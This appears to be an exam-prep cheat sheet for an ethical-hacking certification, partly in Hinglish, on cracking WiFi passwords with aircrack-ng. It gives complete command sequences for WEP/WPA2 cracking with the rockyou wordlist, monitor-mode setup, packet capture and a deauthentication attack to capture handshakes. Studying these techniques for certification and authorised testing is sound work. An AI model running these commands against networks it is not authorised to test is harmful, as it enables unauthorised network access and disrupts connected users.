# 📡 Module 9: WiFi Cracking

> **WiFi password crack karo .pcap file se!**

---

## 🔓 Aircrack-ng Suite

### Cracking WEP Network
```bash
# Directly crack WEP from pcap file
aircrack-ng <captured_file.cap>

# Specify the capture file
aircrack-ng /home/attacker/Desktop/WEP_capture.cap
```

### Cracking WPA/WPA2 Network
```bash
# Crack WPA2 with wordlist
aircrack-ng -a2 -b <Target_BSSID> -w <wordlist.txt> <WPA2_capture.cap>

# Example:
aircrack-ng -a2 -b AA:BB:CC:DD:EE:FF -w /usr/share/wordlists/rockyou.txt capture.cap

# Simplified version:
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

### Aircrack-ng Flags
| Flag | Meaning |
|------|---------|
| `-a` | Force attack mode (1=WEP, 2=WPA) |
| `-b` | Target BSSID (MAC address) |
| `-w` | Wordlist path |
| `-e` | Target ESSID (Network name) |
| `-l` | Output file for the key |

---

## 📶 Full WiFi Hacking Process (If asked in detail)

### Step 1: Put Interface in Monitor Mode
```bash
# Check wireless interfaces
airmon-ng

# Start monitor mode
airmon-ng start wlan0
# Interface becomes wlan0mon

# Kill interfering processes
airmon-ng check kill
```

### Step 2: Capture Packets
```bash
# Scan for networks
airodump-ng wlan0mon

# Target a specific network
airodump-ng -c <channel> --bssid <target_BSSID> -w capture wlan0mon
# -c = channel number
# --bssid = target MAC
# -w = output file prefix
```

### Step 3: Deauthentication Attack (Get Handshake)
```bash
# Send deauth packets (in new terminal)
aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
# -0 = deauth attack
# 10 = number of packets
# -a = AP MAC address
# -c = Client MAC address

# Wait for "WPA handshake" to appear in airodump
```

### Step 4: Crack the Password
```bash
# Crack captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Step 5: Stop Monitor Mode
```bash
airmon-ng stop wlan0mon
```

---

## 🔑 Common Wordlist Locations
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/home/attacker/Desktop/CEH_TOOLS/Wordlists/
/usr/share/john/password.lst
```

---

## ✅ WiFi Cracking Quick Exam Workflow
```
Exam mein usually .pcap file milti hai crack karne ko:

1. Check if WEP or WPA2 (question mein bataya hoga)
2. WEP:  aircrack-ng capture.cap
3. WPA2: aircrack-ng -a2 -b <BSSID> -w rockyou.txt capture.cap
4. Password mil jayega!
```

